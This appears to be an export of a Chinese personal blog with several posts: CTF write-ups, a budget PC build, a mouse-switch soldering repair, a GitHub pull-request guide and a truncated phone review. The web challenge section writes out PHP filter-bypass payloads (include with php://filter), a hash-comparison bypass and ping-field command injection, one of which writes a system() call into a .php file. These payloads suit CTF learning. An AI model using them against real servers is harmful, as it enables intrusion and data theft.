扫码得到：swpuctf{flag_is_not_here}\nbinwalk提取出4个rar，第一个解压出一张图片和一个加密的压缩包，第二个得到一TXT，内容为base64编码，解码得到：asdfghjkl1234567890，试着解压上一个压缩包，发现解压出来的图片和原本的图片是一样的。。。。第三个得到.doc文件，里面是一大堆字符，第四个是加密压缩包。\n让AI写了循环解码脚本，得到：comEON_YOuAreSOSoS0great\n1 2 3 4 5 6 7 8 9 10 import base64 encoded_string = input(\u0026#34;请输入要解码的 base64 字符串：\u0026#34;) count = 0 while encoded_string: decoded_string = base64.b64decode(encoded_string).decode(\u0026#39;utf-8\u0026#39;) print(f\u0026#34;解码 {count} 次后的结果：{decoded_string}\u0026#34;) count += 1 encoded_string = decoded_string 解压压缩包，得到音频文件，判断为摩斯电码，得到：\nmorseisveryveryeasy\n[BJDCTF2020]纳尼 纳尼？GIF是假滴！不慌，看下十六进制先，发现该文件没有gif格式头文件，于是010 editor启动！新建个文件，添加文件头（47 49 46 38 39 61）后把源文件拷过去试试，轻松秒杀！得到一张含文本的GIF图片，随后我们拆帧，得到：\nQ1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0=\nbase64解码得到：CTF{wang_bao_qiang_is_sad}\n[HBNIS2018]excel破解 16进制直接查找flag字符：\nflag is here CTF{office_easy_cracked}\nture dude.\n[HBNIS2018]来题中等的吧 读图得到摩斯电码：.-/.-../.--./..../.-/.-../.-/-...\n破译得到：ALPHALAB\n。。。查了半天图片，发现这个全小写就是flag。。。说好的中等的呢。。。\n梅花香之苦寒来 exif：\n1 2 Image Artist：出题人已跑路~ Image ImageDescription：图穷flag见 十六进制查看，发现末尾有许多数字和字母，初步判断为十六进制字符，010editor提取出来，发现是一堆坐标。。。查阅wp，原来是要靠这些坐标生成矢量图。。。\n于是在kali安装gnuplot:\n1 apt-get install gnuplot copy过来的脚本稍加修改，把格式转换一下：(x,y) -\u0026gt; x y\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 with open(\u0026#39;xy.txt\u0026#39;, \u0026#39;r\u0026#39;) as a: a = a.read() a = a.split() tem = \u0026#39;\u0026#39; with open(\u0026#39;changed.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: for i in range(0, len(a)): tem = a[i] tem = tem.lstrip(\u0026#39;(\u0026#39;) tem = tem.rstrip(\u0026#39;)\u0026#39;) for j in range(0, len(tem)): if tem[j] == \u0026#39;,\u0026#39;: tem = tem[:j] + \u0026#39; \u0026#39; + tem[j + 1:] f.write(tem + \u0026#39;\\n\u0026#39;) gnuplot生成：\n1 gnuplot\u0026gt; plot \u0026#34;changed.txt\u0026#34; 得到：\n扫码得到：flag{40fc0a979f759c8892f4dc045e28b820}\n谁赢了比赛？ foremost提取出rar，里面有个加密的hehe.gif，使用APCHPR秒了：1020\n解压打开，发现是一个棋局，只需要看到最后就能得到flag啦！（被打死\n看半天，发现第308和309帧不一样，其中309帧写着：do_you_know_where is_the_flag\n放到StegSolve.jar， red plane得到二维码：\n扫码得到：flag{shanxiajingwu_won_the_game}\n[ACTF新生赛2020]outguess 图片exif中的备注: 公正民主公正文明公正和谐\n社会主义核心价值观解密：abc\noutguess加密\n安装outguess:\n1 2 3 git clone https://github.com/crorvick/outguess ./configure \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install 解密：\n1 2 3 outguess -k \u0026#39;abc\u0026#39; -r mmm.jpg out.txt cat out.txt 得到：\nACTF{gue33_Gu3Ss!2020}\n[WUSTCTF2020]find_me 备注里找到了：⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=\n似曾相识，盲文，假如给我三天光明\n在线解密网站：文本加密为盲文,可自设密码|文本在线加密解密工具\n解密得到：wctf2020{y$0$u_f$1$n$d$_M$e$e$e$e$e}\n穿越时空的思念 audacity打开，发现是摩斯电码:\n..-. ----- ..--- ----. -... -.. -.... ..-. ..... ..... .---- .---- ...-- ----. . . -.. . -... ---.. . ....- ..... .- .---- --... ..... -... ----- --... ---.. -....\n解码得到：\nF029BD6F551139EEDEB8E45A175B0786\n即为flag{f029bd6f551139eedeb8e45a175b0786}\n[SWPU2019]我有一只马里奥 双击打开，得到文本：\n1 2 ntfs flag.txt 查阅wp得知，命令行打开：\nnotepad 1.txt:flag.txt\n得到swupctf{ddg_is_cute}\n[GUET-CTF2019]KO https://www.splitbrain.org/services/ook\n解密得到：welcome to CTF\n[ACTF新生赛2020]base64隐写 参考wp脚本，多次解密base64:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import base64 b64chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39; with open(\u0026#39;./base64.txt\u0026#39;, \u0026#39;rb\u0026#39;) as f: flag = \u0026#39;\u0026#39; bin_str = \u0026#39;\u0026#39; for line in f.readlines(): stegb64 = str(line, \u0026#34;utf-8\u0026#34;).strip(\u0026#34;\\n\u0026#34;) rowb64 = str(base64.b64encode(base64.b64decode(stegb64)), \u0026#34;utf-8\u0026#34;).strip(\u0026#34;\\n\u0026#34;) offset = abs(b64chars.index(stegb64.replace(\u0026#39;=\u0026#39;, \u0026#39;\u0026#39;)[-1]) - b64chars.index(rowb64.replace(\u0026#39;=\u0026#39;, \u0026#39;\u0026#39;)[-1])) equalnum = stegb64.count(\u0026#39;=\u0026#39;) # no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) # flag += chr(int(bin(offset)[2:].zfill(equalnum * 2), 2)) # print(flag) 这样写得不出正确结果 print([chr(int(bin_str[i:i + 8], 2)) for i in range(0, len(bin_str), 8)]) # [\u0026#39;A\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;}\u0026#39; flag{6aseb4_f33!}\n[第五空间 2021]alpha10 foremost提取文件，得到一张jpg一张png，推测双图盲水印：\n随波逐流没反应。。。用下面这个仓库：\n(BlindWaterMark)[https://github.com/chishaxie/BlindWaterMark]\n安装依赖后执行：\n1 2 PS D:\\CTF\\Tools\\BlindWaterMark\u0026gt; python bwmforpy3.py decode .\\alpha0\\00001537.png .\\alpha0\\00001404.jpg .\\alpha0\\outwm.png image\u0026lt;.\\alpha0\\00001537.png\u0026gt; + image(encoded)\u0026lt;.\\alpha0\\00001404.jpg\u0026gt; -\u0026gt; watermark\u0026lt;.\\alpha0\\outwm.png\u0026gt; 得到：\nflag{XqAe3QzK2ehD5fWv8jfBitPqHUw0}\n","date":"2024-10-31T00:00:00Z","image":"https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/cover_hu_f3ebc453860a1958.png","permalink":"https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/","title":"【更新中】杂项misc解密记录"},{"content":"前言 上个月参加了某高校网络安全社团的招新题，记录一下部分题的解题过程。\n很多题非原创，无法标明出处还请谅解\nmisc misc1 提示：flag在图片数据中\n嗯，根据提示，使用WinHEX打开图片查看16进制元数据，发现flag：\ngeek{unbelievable}\nmisc2 提示：这不只是个图片\nWinHEX查看16进制，发现里面有zip的头尾：\n1 2 3 ZIP 50 4B 03 04 50 4B 05 06 binwalk提取出压缩包，解压得到第二张图片，扫码得到flag：\ngeek{Amazing}\nmisc3 提示：为啥图片不全呢？\n根据提示，对图片进行长宽高修复，得到：\ngeek{HAPPY}\nmisc4 16位编辑器查看，末尾发现有misc4.mp3字样，以及zip的头尾\n使用foremost分离，得到带密码的压缩包\u0026mdash;APCHPR爆破出zip文件密码：2024\n解压得到misc4.mp3，一耳听出莫斯码，得出flag：\ngeek{MORSEISGOOD}\ncrypto crypto1 1 2 密文：Z2Vla3tDb21lIG9uIX0= 提示：Base Base ~~ base64解密得出flag:\ngeek{Come on!}\ncrypto2 猪圈密码解密得到：\ngeek{welcometogeek}\ncrypto3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 题目： 在一个阳光明媚的早晨，小兔子跳跳正在森林里玩耍。它一边跳跃，一边享受着清新的空气和美丽的景色。忽然，它在一棵大树下发现了一个奇怪的盒子，盒子的外观很古老，上面刻着复杂的花纹。 好奇的小兔子决定打开这个盒子。经过一番努力，盒子终于打开了，里面是一封信和一个看似重要的古老符号。信上写着：“这是一个通往秘密世界的钥匙，但你需要找到正确的密码才能进入。” 小兔子心里充满了探险的热情，开始寻找这个密码。它想到了朋友们，决定去问问聪明的小狐狸和勇敢的小熊。 小狐狸听了小兔子的故事，建议道：“或许这个密码就藏在我们平时的生活中。我们可以想象一下，什么事情对我们来说是最重要的。” 小熊则说：“我觉得应该是我们友情的象征，或者我们一起度过的快乐时光。” 小兔子灵机一动，突然想到了一个词：“冒险！”它相信这个词是打开新世界的钥匙。于是，它带着小狐狸和小熊再次回到那个神秘的盒子前，大声喊出了那个词。 然而，盒子却没有反应。小兔子感到有些失望，但它没有放弃，决定再观察一下那个古老的符号。它注意到符号中有一些像是数字和字母的组合。经过一番分析，小兔子想到了一个线索：“如果我们把这些符号想象成一种密码，那会不会是字母和数字的结合？” 经过一番讨论和尝试，它们最终拼出了一个神秘的字符串。小兔子觉得这个字符串有种特别的感觉，可能就是那个通往秘密世界的关键。 小兔子再次勇敢地对着盒子大声说出这个字符串。随着最后一个字母的发出，盒子发出了一声“咔嚓”声，缓缓打开了。里面闪烁着五彩斑斓的光芒，不同的奇幻生物纷纷出现，它们带来了无数的新奇和冒险。 小兔子、小狐狸和小熊兴奋地跳了起来，决定一起探索这个全新的世界。他们知道，只要团结在一起，任何谜题都能被解开，未来的冒险一定会更加精彩！ 至于那条密文“U2FsdGVkX1/saBrBFn5W/3kLIuGaSpo1BS+F4PyHJSNglsQ=”，它仿佛是这个神秘世界的另一把钥匙，等待着他们去解锁更多未知的宝藏和故事。冒险才刚刚开始！ 这道题一开始以为是base混合加密，因为一开始前半部分base64解码出了Salted_完整字符，尝试了好久都没解出来。之后看官方WP，才知道原来是rabbit密码；\ngeek{you are great}\ncrypto4 1 小张把女儿出生日期的哈希值写在纸上，结果不小心将外卖洒在了上面，只能看到后10位是2b74d3e7a1，你能猜到他女儿的生日吗？哦!他女儿属兔哦。（提示：flag为密码的哈希值） 通过python程序暴力列举得到生日20231028\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import hashlib import itertools import hmac #https://blog.csdn.net/mails2008/article/details/140398473 key = \u0026#34;2b74d3e7a1\u0026#34; characters = \u0026#34;1234567890\u0026#34; dir_list = itertools.product(characters, repeat=8) for i in dir_list: res = hashlib.md5(\u0026#39;\u0026#39;.join(i).encode()).hexdigest() if res[-10:] == key: print(\u0026#34;birthday;\u0026#34; + str(i)) print(str(res)) #output: #birthday;(\u0026#39;2\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;8\u0026#39;) #2473ff35a9ae66a24b8995\u0026lt;mark\u0026gt;2b74d3e7a1\u0026lt;/mark\u0026gt; 参考了 csdn 做了一些修改、\ncrypto5 1 2 3 题目：三个小姐两个爹JM2VMRKVKYZUGSJVINMFKWSDJBEEMVSWJVGUGMSHIZBUMTKRKNEEWWSMI5DU2Q2YJZFEQRSBKZCEYTCFLJDEWVSCKFEEMSKGJFGUENI= 提示1：大老爷有一个女儿，二老爷有两个女儿 提示2：老爷留了12个金条，剩下16条都给了小姐 提取所有数字得到key1221216,base26-32-64-91混合解码得到Z2Vla3todWFuPFUW4Z3ONF6Q====,base64解码得到一半是乱码\u0026hellip;得到了geek{huan\n后来查看官方WP，原来是两部分。。。：\n1 2 Z2Vla3todWFu PFUW4Z3ONF6Q==== 将第一个用base64解码得到geek{huan，第二个用base32解码得yingni}拼接后得到flag是geek{huanyingni}\n只有大写字母和数字，像base32加密\n学到了。。。\nweb web1 注释找到ZmxhZ+WcqC93ZWIvd2ViM59mbGFnL2ZsYWcudHh0\nbase64解码得到\nflag在http://ip/web/web1/flag/flag.txt\n访问得到geek{crazy}\nweb2 注释base64解码得到你会用dirsearch吗？\ndirsearch扫描网站目录\n1 python.exe ./dirsearch.py -u http://ip/web/web2/ 得到http://ip/web/web2/flag.php，访问得到flag:geek{Excellent}\nweb3 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 利用PHP命令eval()可以执行系统命令：\nhttp://ip/web/web3/index.php?c=include$_GET[\u0026quot;a\u0026quot;]?\u0026gt;\u0026amp;a=php://filter/read=convert.base64-encode/resource=flag.php\n得到PD9waHANCiRmbGFnPsInZWVre3ByZXR0eWdvb2R9ljsNCj8+\nbase64解码得到\u0026lt;?php$flag=\u0026quot;geek{prettygood}\u0026quot;;?\n原理：\npreg_match()：执行一个正则表达式匹配,过滤掉/flag|system|php|cat|sort|shell|\\.| |\\'|\\|echo|\\;|\\(/，为了使正则失效，在输入c后加上\u0026gt;来闭合PHP代码，再通过PHP伪协议获取flag的base64。\nweb4 分析可得，需要传入一个值，该值的MD5的MD5还等于该值的MD5。。。\n谷歌一下，找到相关知识点0e漏洞：\nPHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。from: [md5 collision碰撞]即PHP对0e的缺陷漏洞\n没找到。。。看官方WP找到值：0e215962017\n传入server.php?md5=0e215962017\n得到flag:geek{wonderful}\nweb5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php // flag in flag.php highlight_file(__FILE__); if (isset($_GET[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;b\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;c\u0026#39;]) \u0026amp;\u0026amp; isset($_COOKIE[\u0026#39;name\u0026#39;])) { $a = $_GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; $c = $_POST[\u0026#39;c\u0026#39;]; $name = $_COOKIE[\u0026#39;name\u0026#39;]; if ($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)) { if (!is_numeric($c) \u0026amp;\u0026amp; $c != 1024 \u0026amp;\u0026amp; intval($c) == 1024) { include($name.\u0026#39;.php\u0026#39;); } } } ?\u0026gt; 需要a不为b且他俩md5值一样，c是不为1024但取整后是1024，并且要通过cookie传入一个名字：\npayload:/?a=240610708\u0026amp;b=314826850 POST：c=1024.1a COOKIE=name=php://filter/read=convert.base64-encode/resource=flag.php\nhackbar拓展传入，得到base64密文PD9waHAgIA0KJGZsYWcgPSAnZ2Vla3tZb3UgYXJlIGdyZWF0fSc7IA0KPz4=\nbase64解码得到flag：geek{You are great}\nweb6 查看源码找到\u0026lt;!-- visit '/api.php?source' for hint --\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php function sanitize($s) { $s = str_replace(\u0026#39;;\u0026#39;, \u0026#39;\u0026#39;, $s); $s = str_replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;, $s); $s = str_replace(\u0026#39;/\u0026#39;, \u0026#39;\u0026#39;, $s); $s = str_replace(\u0026#39;flag\u0026#39;, \u0026#39;\u0026#39;, $s); return $s; } if (isset($_GET[\u0026#39;source\u0026#39;])) { highlight_file(__FILE__); die(); } if (!isset($_POST[\u0026#39;ip\u0026#39;])) { die(\u0026#39;No IP Address\u0026#39;); } $ip = $_POST[\u0026#39;ip\u0026#39;]; $ip = sanitize($ip); if (!preg_match(\u0026#39;/((\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.){3}(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])/\u0026#39;, $ip)) { die(\u0026#39;Invalid IP Address\u0026#39;); } system(\u0026#39;ping -c 4 \u0026#39;.$ip. \u0026#39; 2\u0026gt;\u0026amp;1\u0026#39;); ?\u0026gt; 参考0xGame 2023 - CSDN\n; ⽤ %0a 绕过, 空格⽤ ${IFS} 绕过, / 以及 flag ⽤ base64 编码绕过:\npostip=127.0.0.1|ls%09..发现geek目录;\npostip=127.0.0.1|echo%09\u0026quot;PD9waHAgc3lzdGVtKCdscyAuLi9nZWVrJyk7\u0026quot;|base64%09-d%09\u0026gt;2.php，执行无响应。。。\n然后就解不出来了。。。查看WP:\n输入127.0.0.1\u0026amp;\u0026amp;cd${IFS}..\u0026amp;\u0026amp;cd${IFS}geek\u0026amp;\u0026amp;ls切换到geek目录中，发现flag.php\n因为过滤了flag，所以可以用cat${IFS}fla*来查看其中内容\n通配符绕过过滤！学到了！\n得到flag:geek{hello geeker}\nreverse reverse1 IDA Pro反编译在main函数中找到了flag{ajsju19hLDUkdrs8KB6Sl}\nreverse2 反编译查找胜利字符，找到 KSLSHDDOWskldrfsKSJ\ngeek{KSLSHDDOWskldrfsKSJ}\n结尾 初知CTF，刚看到题就沉迷进去了，除了吃饭和睡觉满脑子都是题XDDD，有几道题还是上课摸鱼解出来的。最快乐的时候莫过于解出一道题，最痛苦的时候莫过于写WP（（（。\n","date":"2024-10-30T00:00:00Z","image":"https://blog.wuko.top/posts/2024/10/30/newbiectf.html/cover_hu_c815d8f784732af5.jpg","permalink":"https://blog.wuko.top/posts/2024/10/30/newbiectf.html/","title":"某高校CTF招新题MD——初试CTF"},{"content":"前言 自打我记事以来，家里就已经有了一台电脑，这让我很早就接触到了互联网以及了解了很多这方面的知识。时与变迁，这台电脑的配置已经远远落后于时代（鲁大师击败全国百分之一），在经历了加内存（1+2换2+2）、升系统（xp-7-10）、加固态、加显卡（HD6450）后，终于得出结论：平台没救了。于是便有了本次装机。\n关于旧电脑 先看配置：\n配件 23333 CPU AMD 速龙II X2 240 2.8GHz 2C2G 主板 映泰MCP6P M2 显卡 主板集成 内存 ddr2 800MHz 2g *2 其他 IDE光驱、250g希捷机械 2009，我家花费两千元左右买了电脑。\n2011，注册了我的第一个QQ与微博（腾讯）。\n2018，学习C4D，并用这台电脑渲染了累计十多个小时。。\n2019，学习了Python，使用这台电脑开发了众多项目（虽然基本都弃坑了）。\n2020，承担了网课重任，为了视频升级成了Win7，并且开始接触网站建设。\n2021，电脑正式归我，开始接触Linux。\n\u0026hellip;\n感谢多年陪伴，这麽多年下来这套配置依然能够流畅win10ltsc与办公，但是因为集显驱动没有win10支持，以及主板PCIe x16槽接触不良无法稳定加装显卡，于是便有了装新机的念头。\n硬件的购入 提前看了非常多的捡垃圾视频，最后确定了以下的配置：\n配件 价格 CPU AMD A8-7500 25.97 显卡 AMD Radeon R7 核显 主板 映泰A68mpl 38 散热 寒冰100 17.9 内存 威刚ddr3 1600Mhz 4g *2 14.37 硬盘 幻隐 HC2000 256g SATA3 SSD 拆机 希捷 200g HDD 拆机 电源 康舒PC6001 280W 拆机 机箱 H2 27.9 共计 124.14 即使换了新机箱，加起来的价格也不到125元！\n另外特别说说我的固态硬盘，是23年6月国产颗粒大火的时候最低价78买的，现在24年6月卖149，赚翻了XD。\n到货装机 开始装机 有条件请播放油管源，B站压缩的太狠了。。。。。。。。\nB站源\n【【空】第一次装机】 https://www.bilibili.com/video/BV19t421j7CC (若只哔哩哔哩iframe禁不了自动播放)\nYoutube\n成功点亮！\n彩色中文BIOS界面！居然还能用鼠标，科技感满满！再也不是原来的蓝天白云了。\n测试没问题就装到了机箱： 真难装。。。比前面还难装，主板和机箱孔位死活对不齐，最后大力出奇迹解决了。理线？盖板一盖，谁也不爱！\n体验 懒得重装系统了，没想到可以直接进系统并且没有任何兼容问题，要知道我用的可是精简版的Windows 10 企业版 LTSC 21H2，开机炒鸡快，爽歪歪。\n用DDU删掉了原来的N卡驱动，到AMD官网下载了最新的驱动（A8-7600 with Radeon™ R7 Series Drivers 220623），安装之后\u0026hellip;感觉显示效果很奇怪，并且全屏进入游戏后会出现色彩异常，最后换到了一个更老的驱动才恢复正常，只能说不愧是A卡？\n得益于双热管塔式散热，电脑桌面挂机CPU温度在3摄氏度左右，正常办公码字温度在10摄氏度，满负荷游戏在35摄氏度，均为夏天，真怕给CPU干感冒了2333。\nSATA3接口，原来买的固态终于能满速跑了。鲁大师跑分21.5W，击败全国百分之九的人，旧电脑跑分会死机。\n唯一担心的就是电源，280W在打游戏时非常烫，电源呼呼吹热风，但是几个月以来没有过死机蓝屏症状（除了打开AMD relive打游戏会卡死），很不错了。\n尾声 文章从一月写到六月，终于是在这高考结束第二天写完了。有了新电脑后才发现，最快乐的时候不是用它打游戏，而是装机并点亮的瞬间\u0026hellip;现在经常看着桌面发呆，游戏也玩腻了\u0026hellip;\n","date":"2024-06-09T00:00:00Z","image":"https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/004_hu_6a12841bda6c4d1f.jpg","permalink":"https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/","title":"第一次捡垃圾装PC\u0026我的电脑历程"},{"content":"记：小白初试电烙铁之鼠标微动更换 省流：翻车了，但是又救回来了\n前言 在本人从十年前的红光鼠标换到现在的罗技g102之间，其实是有一年多的时间在用一个三无的二模无线鼠标（2.4Ghz+蓝牙），说实话其实还蛮好用的，除了太小（半边手都在鼠标垫上摩擦，并且我还玩OSU。。。）和太贵（价格能买一套小米无线键鼠还有剩余，何况我还用不上蓝牙）外，基本上没有缺点。\n直到用了一年后的某一天，得益于它使用的静音微动，寿命短，左键开始罢工。勉强用了一个月后，还是下单了G102，随后这个鼠标就开始在柜子里吃灰，直到一天，偶然刷到电烙铁的视频，我的目光就投到了它的身上，于是便有了这篇文章。\n开始 先看下总花费吧（叠券了）：\n物 价 907电烙铁 24.6 CNY 6337含松香锡丝 0.6 mm 11.81 CNY 烙铁架＋海绵＋松香 6.08 CNY 吸锡器 0.38 CNY 凯华方形静音微动*2 0.55 CNY 总合计 43.42 CNY 没错，全部包邮！也就是说，如果你工具齐全的话，只需要五毛多就可以换掉原先的微动，几乎零成本。可惜本人从未接触过电烙铁，遂购入全套电烙铁装备，开始了本小白的第一次焊锡。\n等待所有东西到货以及一个空闲的周末，迫不及待拆开鼠标，和家伙们来一张合影:\n拆微动 首先给高温海绵加水，不宜太多，不然容易流得到处都是；也不要不加水就开始用，不然直接烧黑海绵，还会损害烙铁头…设定325℃，给电烙铁通电，等待烙铁头变热。往上沾点松香，烙铁头冒烟时，差不多就到了可以熔锡的温度了。\n拉锡丝触碰烙铁头，可以一触即熔就OK。给烙铁头上一层锡，防止烙铁头与空气接触加热被氧化。固定好鼠标的电路板，有能力的可以买一个夹具台或者直接上焊台(，不建议一只手拿电路板一只手拿电烙铁，容易出事故。\n找到鼠标微动位置，翻到背面找到对应针脚，一般是2或3个，向每一个针脚上挂一定量的锡，利用低温锡来降低电路板原有的高温锡，来回反复用烙铁头加热各个针脚上的锡直至正面微动松动，利用重力或者些许外力给微动整下来。\n到这里任务就已经完成三分之一了，讲讲我上面步骤所踩的坑吧。\n首先是犯下了过度加热之罪，加热电路板时间过长，这为后面的翻车埋下了伏笔…\n其次是没准备好焊接的环境。熔化的锡把桌垫表面烫坏了，后面垫了一张鼠标垫。还有就是应该备一个小风扇来吸走焊接产生的烟雾，偶尔一次可能还好，但为长期健康着想，还是少吸点吧\u0026hellip;\n最后是挂的锡不宜太多，本人一开始弄了太多结果落到了其他元件针脚上\u0026hellip;清理了好久。\n清理锡\u0026amp;安装新微动 个人认为最难的一部分，对于没有经验的小白来说可能是最耗时的部分，本人花了一个多小时才清理干净，在此讲一下本人摸索到的方法：\n先把板子竖直立起来，有锡的那面对准拿烙铁的手，另一面也就是装微动的那面对准拿吸锡器的另一只手。先把吸锡器头怼到正面焊盘，再用烙铁加热背面的锡，待锡熔化时同时按下吸锡器和抬起烙铁，这样一个通透的焊孔就出现了，然后我就发现我的板子焊盘被我整掉了\u0026hellip;\n急忙上网查资料，原来正是因为我先前连续加热时间过长，高温导致了焊盘离板子而去\u0026hellip;所以切忌加热时间过长！惨痛的教训：(\n总之先把微动装上去吧，看看好不好使\u0026hellip;\n凯华这个微动的针脚中间金属片是凸出来的，一开始试着大力出奇迹直接捅进去，结果针脚歪了也没进去，于是请出家中十年前的老虎钳扶正了针脚并且把凸出部分压了压，轻松搞定。\n继续掏出烙铁，翻到板子背面给针脚上锡，覆盖焊盘略微突出即可。\n插电，开机，轻松秒杀\u0026hellip;的情景并没有出现。\n焊盘脱落导致了微动并没有连接到主板，左键依然无法使用。\n于是乎，事情被搁置，直到下一个周末。\n飞线（锡） 隔了一周，又重拾起板子。\n用小刀找准线路，刮掉绿漆，把里面的铜线露出来，和以前一样的步骤，熔坨锡在针脚上面。\n因为我刮的地方离针脚还蛮近，所以懒得用导线连接直接用一坨锡连接了，如果用导线连接的活，线头记得沾点松香，防止线头不沾锡。\n虽然很难看但是能用就行！装回去插到电脑上测试，解决！\n后语 实践花了两个星期，但写完这篇文章花了一个月\u0026hellip;高三时间真的好宝贵= =\n属此文以录高三生活中的忙里偷闲。\n","date":"2023-10-14T00:00:00Z","image":"https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/013_hu_80ba6af305e2a17c.png","permalink":"https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/","title":"记：小白初试电烙铁之鼠标微动更换"},{"content":"什么是pr?如何pr?一个面向小白的Github项目——first-contributions 前言 相信许多人在浏览Github时经常看到一个关键词：pr ，这并不是指Adobe开发的视频剪辑工具，而是指 Pull Requests，举个例子，你看到一个repo代码还有优化的空间，你就可以fork到你自己的仓库，改动后提交pr，原仓库主人会收到你的pr请求，如果他觉得你的写的不错，就会将你的分支合入到主分支，这就是pr，你可以在这里找到：Github - Pull Requests\n相信许多像我一样的入门小白这个页面都是这样的：\n那么，有没有办法来亲身体验一次pr的整个流程呢？这就是我们今天要了解的一个仓库：first-contributions\n该仓库也有中文文档：zh-cn，可参考该文档。\n在开始前，请确保你的设备能够使用 git 命令。\n开始 1，Github建立分支仓库 登录你的GitHub账号，打开该仓库地址：这里\n点击 Fork\nFork之后转到你Fork的仓库，点击绿色的 Code 按钮，选择 HTTPS或SSH。\n这里以https来举例：\n点击 Https ，点击复制按钮或者自行复制。\n2，克隆仓库并建立新分支 在任意位置打开命令行（这里用的是Git Bash）\n【1】\n1 git clone [你复制的链接] 在进度走到100%后，使用切换目录命令进入 first-contributions 。\n【2】\nWindows/Linux:\n1 cd first-contributions 【3】\n创建并切换到一个新分支：\n1 git checkout -b [分支名] 注：分支名建议以 add- 开头\n3，添加自己到贡献者列表并推送 使用任意文本编辑器打开目录下的 Contributors.md 文件，建议使用支持Markdown格式的编辑器（如VS code），请勿使用word。\n在末尾以MD格式填入你的名字和Github主页：\n1 - [名字](你的主页地址) 这会将你的名字与主页添加到贡献者列表。\n【1】\n使用 git status 查看当前状态：\n1 git status 【2】\n添加改动文件：\n1 git add Contributors.md 这里偷懒用了 . ，即添加所有有改动的文件。\n【3】\n提交改动的文件：\n1 git commit -m \u0026#34;Add [Yourname] to Contributors list\u0026#34; 记得把空改了。\n4，推送，然后合并 【1】\n推送你的修改到你的仓库，此时一个新分支在GitHub被创建：\n1 git push origin add-[你自己的名字] 【2】\n打开你克隆的仓库的主页，你会看到一个绿色的按钮 Compare \u0026amp; pull request 。\n点击它，进入pr界面，此页面显示了一些相关的信息，默认无需更改。\n点击 Create pull request ，将你的分支汇入主分支。\n恭喜你！现在你已经完成了一个pr！现在等待管理批准你的pr！\n此项目已启用bot来审核pr，所以如果你前面的步骤都ok，那么你很快就会从GitHub网页和Email收到成功通知；如果你的pr被驳回了，不要沮丧，检查你的每一步是否有错误。\n尾声 对于刚入门的小白来讲，想要跨过从无到有这一步很困难，但只要坚持走下去，就会复行数十步，豁然开朗，共勉。\n","date":"2023-08-02T00:00:00Z","image":"https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/012_hu_6a18669d2b222cf0.png","permalink":"https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/","title":"什么是pr?如何pr?一个面向小白的Github项目——first-contributions"},{"content":"Xiaomi XAGA 购机与使用体验 写在前面 Xiaomi xaga即Redmi Note11TPro/Poco X4 GT的工程代码，仅作业系统与发售地区不同。\n本文所写仅代表本手机本人主观体验感受，仅供参考。本文所描述仅限本人手持机器情况，可能存在机器间差异\n手机：Redmi Note11T Pro 8+128 操作系统：MIUI 13.0.11 Android12\n购入 